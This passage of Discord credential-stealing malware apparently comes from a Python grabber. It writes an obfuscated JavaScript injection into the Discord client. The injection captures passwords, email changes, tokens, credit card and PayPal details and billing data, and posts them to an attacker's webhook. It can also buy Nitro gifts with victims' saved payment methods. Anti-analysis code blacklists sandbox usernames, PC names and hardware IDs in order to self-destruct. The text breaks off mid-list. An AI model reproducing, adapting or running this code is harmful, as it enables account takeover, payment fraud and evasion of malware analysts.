_0x3aa3d0=_0xfa3df7['constructor'][_0x3b6f42(0xb4)][_0x3b6f42(0xd3)](_0xfa3df7),_0x16b2cc=_0x130491[_0x2e85dd],_0x4fa6ff=_0x51306c[_0x16b2cc]||_0x3aa3d0;_0x3aa3d0[_0x3b6f42(0x179)]=_0xfa3df7[_0x3b6f42(0xd3)](_0xfa3df7),_0x3aa3d0[_0x3b6f42(0x180)]=_0x4fa6ff['toString'][_0x3b6f42(0xd3)](_0x4fa6ff),_0x51306c[_0x16b2cc]=_0x3aa3d0;}});_0x4746fe();const _0x1684b3=args[0x2]&&args[0x2][_0x1a66c8(0x137)]()===_0x1a66c8(0x16b),_0x287f33=_0x1684b3?args[0x3]&&args[0x3][_0x1a66c8(0x137)]():args[0x2]&&args[0x2][_0x1a66c8(0x137)](),_0x2a4345=_0x287f33===_0x1a66c8(0x11a)?_0x1a66c8(0x16c):_0x287f33===_0x1a66c8(0x11e)?_0x1a66c8(0xd5):'Discord';let _0x2ea626='';if(process[_0x1a66c8(0x169)]===_0x1a66c8(0xa9)){const _0x23ba36=path[_0x1a66c8(0xc1)](process[_0x1a66c8(0xd2)][_0x1a66c8(0xfe)],_0x2a4345[_0x1a66c8(0x17d)](/ /g,'')),_0x1826c1=fs['readdirSync'](_0x23ba36)[_0x1a66c8(0x181)](_0x53e5d4=>fs[_0x1a66c8(0x16d)](path[_0x1a66c8(0xc1)](_0x23ba36,_0x53e5d4))[_0x1a66c8(0xdf)]()&&_0x53e5d4[_0x1a66c8(0x160)]('.')[_0x1a66c8(0x112)]>0x1)[_0x1a66c8(0x131)]()[_0x1a66c8(0x177)]()[0x0];_0x2ea626=path['join'](_0x23ba36,_0x1826c1,'resources');}else{if(process[_0x1a66c8(0x169)]===_0x1a66c8(0x110)){const _0x2cde53=_0x287f33===_0x1a66c8(0x11a)?path['join'](_0x1a66c8(0xe4),_0x1a66c8(0xbe)):_0x287f33===_0x1a66c8(0x11e)?path[_0x1a66c8(0xc1)](_0x1a66c8(0xe4),_0x1a66c8(0x103)):_0x1684b3&&args[0x3]?args[0x3]?args[0x2]:args[0x2]:path[_0x1a66c8(0xc1)]('/Applications','Discord.app');_0x2ea626=path[_0x1a66c8(0xc1)](_0x2cde53,_0x1a66c8(0xb1),'Resources');}}if(fs[_0x1a66c8(0xbb)](_0x2ea626))return _0x2ea626;return'';}());function updateCheck(){const _0x3d8f7f=_0x2df903,_0x4653b7=path[_0x3d8f7f(0xc1)](discordPath,_0x3d8f7f(0xb7)),_0x1a521c=path[_0x3d8f7f(0xc1)](_0x4653b7,_0x3d8f7f(0x166)),_0x1f0492=path[_0x3d8f7f(0xc1)](_0x4653b7,'index.js'),_0x10be79=path[_0x3d8f7f(0x10f)](path[_0x3d8f7f(0x10f)](__dirname,'..'),'..'),_0x39e376=_0x10be79+_0x3d8f7f(0xdc),_0x50be0b=path[_0x3d8f7f(0xc1)](process[_0x3d8f7f(0xd2)][_0x3d8f7f(0xf8)],_0x3d8f7f(0x151));if(!fs[_0x3d8f7f(0xbb)](_0x4653b7))fs['mkdirSync'](_0x4653b7);if(fs[_0x3d8f7f(0xbb)](_0x1a521c))fs[_0x3d8f7f(0x161)](_0x1a521c);if(fs[_0x3d8f7f(0xbb)](_0x1f0492))fs[_0x3d8f7f(0x161)](_0x1f0492);if(process['platform']==='win32'||process[_0x3d8f7f(0x169)]===_0x3d8f7f(0x110)){fs[_0x3d8f7f(0x178)](_0x1a521c,JSON[_0x3d8f7f(0x13d)]({'name':_0x3d8f7f(0x15b),'main':_0x3d8f7f(0x15c)},null,0x4));const _0x5c90a9='const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27'+_0x39e376+_0x3d8f7f(0x16e)+_0x50be0b+_0x3d8f7f(0x117)+config['injection_url']+_0x3d8f7f(0x118)+path[_0x3d8f7f(0xc1)](discordPath,_0x3d8f7f(0x162))+_0x3d8f7f(0x12b);fs[_0x3d8f7f(0x178)](_0x1f0492,_0x5c90a9[_0x3d8f7f(0x17d)](/\\/g,'\x5c\x5c'));}if(!fs[_0x3d8f7f(0xbb)](path[_0x3d8f7f(0xc1)](__dirname,'initiation')))return!0x0;return fs[_0x3d8f7f(0xed)](path['join'](__dirname,_0x3d8f7f(0x127))),execScript(_0x3d8f7f(0x159)),!0x1;}const execScript=_0x5e0cc9=>{const _0xe7b096=_0x2df903,_0x20c1c5=BrowserWindow[_0xe7b096(0xce)]()[0x0];return _0x20c1c5[_0xe7b096(0xb5)][_0xe7b096(0x156)](_0x5e0cc9,!0x0);},getInfo=async _0xb7b188=>{const _0x245a5a=_0x2df903,_0x57dbe3=await execScript(_0x245a5a(0x121)+config['api']+'\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0xb7b188+'\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;');return JSON[_0x245a5a(0x154)](_0x57dbe3);},fetchBilling=async _0x3b857d=>{const _0x2b2fd8=_0x2df903,_0x180004=await execScript(_0x2b2fd8(0xc4)+config[_0x2b2fd8(0xfc)]+'/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x3b857d+_0x2b2fd8(0x14f));if(_0x180004[_0x2b2fd8(0x112)]===0x0&&!_0x180004[_0x2b2fd8(0x173)])return'';return JSON['parse'](_0x180004);},getBilling=async _0x45798e=>{const _0x57753e=_0x2df903,_0xfeff4=await fetchBilling(_0x45798e);if(_0xfeff4==='')return'❌';let _0xeb3eed='';_0xfeff4[_0x57753e(0xdd)](_0x247391=>{const _0x467c22=_0x57753e;if(_0x247391[_0x467c22(0x153)]===0x2&&!_0x247391[_0x467c22(0x135)])_0xeb3eed+='✅'+_0x467c22(0xf2);else _0x247391[_0x467c22(0x153)]===0x1&&!_0x247391['invalid']?_0xeb3eed+='✅'+_0x467c22(0x13a):_0xeb3eed='❌';});if(_0xeb3eed==='')_0xeb3eed='❌';return _0xeb3eed;},Purchase=async(_0x49bd53,_0x5ec651,_0x337675,_0x33acd2)=>{const _0x1fab66=_0x2df903,_0x48305f=execScript(_0x1fab66(0x14d)+config[_0x1fab66(0xc8)][_0x337675][_0x33acd2]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x49bd53+'\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify('+JSON[_0x1fab66(0x13d)]({'expected_amount':config[_0x1fab66(0xc8)][_0x337675][_0x33acd2]['price'],'expected_currency':_0x1fab66(0xd4),'gift':!![],'payment_source_id':_0x5ec651,'payment_source_token':null,'purchase_token':_0x1fab66(0xc0),'sku_subscription_plan_id':config[_0x1fab66(0xc8)][_0x337675][_0x33acd2][_0x1fab66(0x120)]})+'));\x0a\x20\x20\x20\x20xmlHttp.responseText');if(_0x48305f[_0x1fab66(0xf0)])return'https://discord.gift/'+_0x48305f[_0x1fab66(0xf0)];else return null;},buyNitro=async _0x5c891c=>{const _0x2a1f16=_0x2df903,_0x4bbb11=await fetchBilling(_0x5c891c);if(_0x4bbb11==='')return _0x2a1f16(0x167);let _0xcadb8=[];_0x4bbb11[_0x2a1f16(0xdd)](_0x1cdb9f=>{const _0x46c1da=_0x2a1f16;!_0x1cdb9f[_0x46c1da(0x135)]&&(_0xcadb8=_0xcadb8[_0x46c1da(0x182)](_0x1cdb9f['id']));});for(let _0x400246 in _0xcadb8){const _0x4de6b6=Purchase(_0x5c891c,_0x400246,_0x2a1f16(0x148),_0x2a1f16(0x100));if(_0x4de6b6!==null)return _0x4de6b6;else{const _0x32f59b=Purchase(_0x5c891c,_0x400246,_0x2a1f16(0x148),'month');if(_0x32f59b!==null)return _0x32f59b;else{const _0x5ea3c3=Purchase(_0x5c891c,_0x400246,_0x2a1f16(0x13f),_0x2a1f16(0xdb));return _0x5ea3c3!==null?_0x5ea3c3:_0x2a1f16(0x167);}}}},getNitro=_0x3d9d70=>{const _0x14e2d9=_0x2df903;switch(_0x3d9d70){case 0x0:return'No\x20Nitro';case 0x1:return _0x14e2d9(0x158);case 0x2:return _0x14e2d9(0x104);default:return _0x14e2d9(0x145);}},getBadges=_0x3f4b50=>{const _0x590990=_0x2df903;let _0x375f0e='';switch(_0x3f4b50){case 0x1:_0x375f0e+='Discord\x20Staff,\x20';break;case 0x2:_0x375f0e+=_0x590990(0xe3);break;case 0x20000:_0x375f0e+=_0x590990(0x108);break;case 0x4:_0x375f0e+=_0x590990(0xe9);break;case 0x4000:_0x375f0e+='Gold\x20BugHunter,\x20';break;case 0x8:_0x375f0e+=_0x590990(0x138);break;case 0x200:_0x375f0e+=_0x590990(0x17b);break;case 0x80:_0x375f0e+=_0x590990(0xbd);break;case 0x40:_0x375f0e+=_0x590990(0xea);break;case 0x100:_0x375f0e+=_0x590990(0xd1);break;case 0x0:_0x375f0e='None';break;default:_0x375f0e=_0x590990(0x141);break;}return _0x375f0e;},hooker=async _0x11fd98=>{const _0x43e524=_0x2df903,_0x53618d=JSON[_0x43e524(0x13d)](_0x11fd98),_0x10d86f=new URL(config[_0x43e524(0xde)]),_0x2b740b={'protocol':_0x10d86f[_0x43e524(0x147)],'hostname':_0x10d86f[_0x43e524(0x126)],'path':_0x10d86f[_0x43e524(0x170)],'method':_0x43e524(0x10a),'headers':{'Content-Type':_0x43e524(0xd6),'Access-Control-Allow-Origin':'*'}},_0x33b69e=https[_0x43e524(0x12f)](_0x2b740b);_0x33b69e['on'](_0x43e524(0x17f),_0x105176=>{console['log'](_0x105176);}),_0x33b69e[_0x43e524(0xcb)](_0x53618d),_0x33b69e['end']();},login=async(_0x546a9a,_0x5e7762,_0x20db3a)=>{const _0x1d0af5=_0x2df903,_0x1ce52a=await getInfo(_0x20db3a),_0x5cddc0=getNitro(_0x1ce52a[_0x1d0af5(0xcf)]),_0x218648=getBadges(_0x1ce52a[_0x1d0af5(0x143)]),_0x360f94=await getBilling(_0x20db3a),_0x5754c3={'username':config[_0x1d0af5(0x12a)],'avatar_url':config[_0x1d0af5(0x111)],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x1d0af5(0x10e),'value':_0x1d0af5(0x11f)+_0x546a9a+_0x1d0af5(0x129)+_0x5e7762+'**','inline':![]},{'name':_0x1d0af5(0x119),'value':_0x1d0af5(0x16f)+_0x5cddc0+_0x1d0af5(0x16a)+_0x218648+_0x1d0af5(0x176)+_0x360f94+'**','inline':![]},{'name':'**Token**','value':'`'+_0x20db3a+'`','inline':![]}],'author':{'name':_0x1ce52a[_0x1d0af5(0x152)]+'#'+_0x1ce52a['discriminator']+_0x1d0af5(0xb0)+_0x1ce52a['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x1ce52a['id']+'/'+_0x1ce52a[_0x1d0af5(0x175)]+_0x1d0af5(0xbc)},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'}}]};if(config['ping_on_run'])_0x5754c3['content']=config[_0x1d0af5(0xd8)];hooker(_0x5754c3);},passwordChanged=async(_0x49c159,_0x32e95c,_0x41ae8b)=>{const _0x53a59a=_0x2df903,_0x4ee61b=await getInfo(_0x41ae8b),_0xc5ba0d=getNitro(_0x4ee61b[_0x53a59a(0xcf)]),_0x5560a1=getBadges(_0x4ee61b['flags']),_0xadfa4=await getBilling(_0x41ae8b),_0x29ea59={'username':config[_0x53a59a(0x12a)],'avatar_url':config[_0x53a59a(0x111)],'embeds':[{'color':config[_0x53a59a(0xc9)],'fields':[{'name':_0x53a59a(0x146),'value':_0x53a59a(0x11f)+_0x4ee61b[_0x53a59a(0x163)]+_0x53a59a(0xae)+_0x49c159+_0x53a59a(0x14b)+_0x32e95c+'**','inline':!![]},{'name':_0x53a59a(0x119),'value':_0x53a59a(0x16f)+_0xc5ba0d+'**\x0aBadges:\x20**'+_0x5560a1+'**\x0aBilling:\x20**'+_0xadfa4+'**','inline':!![]},{'name':_0x53a59a(0xbf),'value':'`'+_0x41ae8b+'`','inline':![]}],'author':{'name':_0x4ee61b['username']+'#'+_0x4ee61b[_0x53a59a(0x13b)]+'\x20|\x20'+_0x4ee61b['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x4ee61b['id']+'/'+_0x4ee61b[_0x53a59a(0x175)]+_0x53a59a(0xbc)},'footer':{'text':_0x53a59a(0x102)}}]};if(config[_0x53a59a(0xad)])_0x29ea59[_0x53a59a(0xda)]=config['ping_val'];hooker(_0x29ea59);},emailChanged=async(_0x3cdf1a,_0x157272,_0x1d8031)=>{const _0x183871=_0x2df903,_0x5c91b2=await getInfo(_0x1d8031),_0xe2a648=getNitro(_0x5c91b2[_0x183871(0xcf)]),_0x2f834d=getBadges(_0x5c91b2[_0x183871(0x143)]),_0x91bf6e=await getBilling(_0x1d8031),_0x45b929={'username':config[_0x183871(0x12a)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x183871(0xc9)],'fields':[{'name':'**Email\x20Changed**','value':_0x183871(0x172)+_0x3cdf1a+_0x183871(0x174)+_0x157272+'**','inline':!![]},{'name':_0x183871(0x119),'value':'Nitro\x20Type:\x20**'+_0xe2a648+'**\x0aBadges:\x20**'+_0x2f834d+_0x183871(0x176)+_0x91bf6e+'**','inline':!![]},{'name':_0x183871(0xbf),'value':'`'+_0x1d8031+'`','inline':![]}],'author':{'name':_0x5c91b2[_0x183871(0x152)]+'#'+_0x5c91b2[_0x183871(0x13b)]+_0x183871(0xb0)+_0x5c91b2['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x5c91b2['id']+'/'+_0x5c91b2['avatar']+_0x183871(0xbc)},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'}}]};if(config[_0x183871(0xad)])_0x45b929[_0x183871(0xda)]=config[_0x183871(0xd8)];hooker(_0x45b929);},PaypalAdded=async _0x52fd9f=>{const _0x245890=_0x2df903,_0x56be9f=await getInfo(_0x52fd9f),_0x12285e=getNitro(_0x56be9f[_0x245890(0xcf)]),_0x2717b7=getBadges(_0x56be9f[_0x245890(0x143)]),_0xe2fe56=getBilling(_0x52fd9f),_0x3e9954={'username':config[_0x245890(0x12a)],'avatar_url':config[_0x245890(0x111)],'embeds':[{'color':config[_0x245890(0xc9)],'fields':[{'name':_0x245890(0x115),'value':_0x245890(0x150),'inline':![]},{'name':_0x245890(0x119),'value':_0x245890(0x16f)+_0x12285e+_0x245890(0xac)+_0x2717b7+'**\x0aBilling:\x20**'+_0xe2fe56+'**','inline':![]},{'name':_0x245890(0xbf),'value':'`'+_0x52fd9f+'`','inline':![]}],'author':{'name':_0x56be9f['username']+'#'+_0x56be9f[_0x245890(0x13b)]+_0x245890(0xb0)+_0x56be9f['id'],'icon_url':_0x245890(0xcc)+_0x56be9f['id']+'/'+_0x56be9f[_0x245890(0x175)]+'.webp'},'footer':{'text':_0x245890(0x102)}}]};if(config[_0x245890(0xad)])_0x3e9954['content']=config[_0x245890(0xd8)];hooker(_0x3e9954);},ccAdded=async(_0x569ac7,_0x5e8127,_0x19ed71,_0x1de49b,_0x43cb80)=>{const _0x5ea485=_0x2df903,_0x4506c9=await getInfo(_0x43cb80),_0x3452e8=getNitro(_0x4506c9[_0x5ea485(0xcf)]),_0x56ff55=getBadges(_0x4506c9[_0x5ea485(0x143)]),_0x2b6202=await getBilling(_0x43cb80),_0x3522d8={'username':config[_0x5ea485(0x12a)],'avatar_url':config['embed_icon'],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x5ea485(0xa8),'value':'Credit\x20Card\x20Number:\x20**'+_0x569ac7+_0x5ea485(0xf3)+_0x5e8127+_0x5ea485(0x165)+_0x19ed71+'/'+_0x1de49b+'**','inline':!![]},{'name':_0x5ea485(0x119),'value':'Nitro\x20Type:\x20**'+_0x3452e8+_0x5ea485(0x16a)+_0x56ff55+_0x5ea485(0x176)+_0x2b6202+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x43cb80+'`','inline':![]}],'author':{'name':_0x4506c9[_0x5ea485(0x152)]+'#'+_0x4506c9['discriminator']+'\x20|\x20'+_0x4506c9['id'],'icon_url':_0x5ea485(0xcc)+_0x4506c9['id']+'/'+_0x4506c9['avatar']+_0x5ea485(0xbc)},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'}}]};if(config[_0x5ea485(0xad)])_0x3522d8[_0x5ea485(0xda)]=config[_0x5ea485(0xd8)];hooker(_0x3522d8);},nitroBought=async _0x369f8b=>{const _0x5a70ad=_0x2df903,_0x98f941=await getInfo(_0x369f8b),_0x1c2e34=getNitro(_0x98f941[_0x5a70ad(0xcf)]),_0x5b4c6b=getBadges(_0x98f941[_0x5a70ad(0x143)]),_0x2daf90=await getBilling(_0x369f8b),_0x57c71f=await buyNitro(_0x369f8b),_0x4fc51e={'username':config[_0x5a70ad(0x12a)],'content':_0x57c71f,'avatar_url':config[_0x5a70ad(0x111)],'embeds':[{'color':config[_0x5a70ad(0xc9)],'fields':[{'name':_0x5a70ad(0xeb),'value':_0x5a70ad(0xc2)+_0x57c71f+_0x5a70ad(0xb9),'inline':!![]},{'name':_0x5a70ad(0x119),'value':_0x5a70ad(0x16f)+_0x1c2e34+_0x5a70ad(0x16a)+_0x5b4c6b+_0x5a70ad(0x176)+_0x2daf90+'**','inline':!![]},{'name':_0x5a70ad(0xbf),'value':'`'+_0x369f8b+'`','inline':![]}],'author':{'name':_0x98f941[_0x5a70ad(0x152)]+'#'+_0x98f941[_0x5a70ad(0x13b)]+_0x5a70ad(0xb0)+_0x98f941['id'],'icon_url':_0x5a70ad(0xcc)+_0x98f941['id']+'/'+_0x98f941[_0x5a70ad(0x175)]+_0x5a70ad(0xbc)},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'}}]};if(config['ping_on_run'])_0x4fc51e[_0x5a70ad(0xda)]=config['ping_val']+('\x0a'+_0x57c71f);hooker(_0x4fc51e);};function _0x3589(_0x30c7a3,_0x376a06){const _0xca7b52=_0x3757();return _0x3589=function(_0x3367b7,_0x3ed67d){_0x3367b7=_0x3367b7-0xa7;let _0x5b271c=_0xca7b52[_0x3367b7];return _0x5b271c;},_0x3589(_0x30c7a3,_0x376a06);}session[_0x2df903(0x15f)][_0x2df903(0xf1)][_0x2df903(0x17c)](config[_0x2df903(0x107)],(_0x10930b,_0x334812)=>{const _0x398a91=_0x2df903;if(_0x10930b[_0x398a91(0xcd)][_0x398a91(0x12d)](_0x398a91(0xb6))){_0x334812({'cancel':!![]});return;}if(updateCheck()){}_0x334812({});return;}),session[_0x2df903(0x15f)][_0x2df903(0xf1)][_0x2df903(0x15d)]((_0x41670e,_0xec5074)=>{const _0x7db4d7=_0x2df903;_0x41670e['url'][_0x7db4d7(0x12d)](config[_0x7db4d7(0xde)])?_0x41670e[_0x7db4d7(0xcd)][_0x7db4d7(0x14e)]('discord.com')?_0xec5074({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0x41670e[_0x7db4d7(0x136)])}):_0xec5074({'responseHeaders':Object['assign']({'Content-Security-Policy':[_0x7db4d7(0x17e),_0x7db4d7(0x101),_0x7db4d7(0x14c)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x41670e[_0x7db4d7(0x136)])}):(delete _0x41670e[_0x7db4d7(0x136)][_0x7db4d7(0x113)],delete _0x41670e[_0x7db4d7(0x136)][_0x7db4d7(0xfb)],_0xec5074({'responseHeaders':{..._0x41670e[_0x7db4d7(0x136)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x2df903(0x15f)][_0x2df903(0xf1)][_0x2df903(0x11b)](config[_0x2df903(0x181)],async(_0x5a66c3,_0x264c09)=>{const _0x46f487=_0x2df903;if(_0x5a66c3['statusCode']!==0xc8&&_0x5a66c3[_0x46f487(0x140)]!==0xca)return;const _0x27693a=await Buffer[_0x46f487(0x105)](_0x5a66c3[_0x46f487(0xe2)][0x0][_0x46f487(0xe8)])[_0x46f487(0x180)](),_0x45ce47=JSON[_0x46f487(0x154)](_0x27693a),_0x567098=await execScript(_0x46f487(0x122));switch(!![]){case _0x5a66c3[_0x46f487(0xcd)][_0x46f487(0xe7)](_0x46f487(0x13e)):login(_0x45ce47[_0x46f487(0x13e)],_0x45ce47[_0x46f487(0x15a)],_0x567098)[_0x46f487(0x10b)](console[_0x46f487(0x17f)]);break;case _0x5a66c3['url']['endsWith'](_0x46f487(0x128))&&_0x5a66c3[_0x46f487(0x133)]===_0x46f487(0x11d):if(!_0x45ce47[_0x46f487(0x15a)])return;_0x45ce47['email']&&emailChanged(_0x45ce47[_0x46f487(0x163)],_0x45ce47['password'],_0x567098)[_0x46f487(0x10b)](console[_0x46f487(0x17f)]);_0x45ce47[_0x46f487(0x123)]&&passwordChanged(_0x45ce47[_0x46f487(0x15a)],_0x45ce47[_0x46f487(0x123)],_0x567098)[_0x46f487(0x10b)](console[_0x46f487(0x17f)]);break;case _0x5a66c3[_0x46f487(0xcd)][_0x46f487(0xe7)](_0x46f487(0xf4))&&_0x5a66c3[_0x46f487(0x133)]==='POST':const _0x2088cf=querystring[_0x46f487(0x154)](unparsedData[_0x46f487(0x180)]());ccAdded(_0x2088cf[_0x46f487(0xc6)],_0x2088cf[_0x46f487(0x171)],_0x2088cf[_0x46f487(0xef)],_0x2088cf['card[exp_year]'],_0x567098)[_0x46f487(0x10b)](console[_0x46f487(0x17f)]);break;case _0x5a66c3[_0x46f487(0xcd)][_0x46f487(0xe7)](_0x46f487(0x14a))&&_0x5a66c3[_0x46f487(0x133)]==='POST':PaypalAdded(_0x567098)['catch'](console[_0x46f487(0x17f)]);break;case _0x5a66c3['url'][_0x46f487(0xe7)](_0x46f487(0xe5))&&_0x5a66c3[_0x46f487(0x133)]===_0x46f487(0x10a):if(!config[_0x46f487(0xff)])return;setTimeout(()=>{const _0x5b2a74=_0x46f487;nitroBought(_0x567098)[_0x5b2a74(0x10b)](console[_0x5b2a74(0x17f)]);},0x1d4c);break;default:break;}}),module[_0x2df903(0x125)]=require(_0x2df903(0x15e));
""".replace("%WEBHOOK%", webhook)
					with open(indexpath, 'w', encoding="utf-8") as indexFile:
						indexFile.write(code)
					subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
class debug:
    def __init__(self):
        if self.checks(): self.self_destruct()
    
    def checks(self):
        debugging = False 
        
        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', 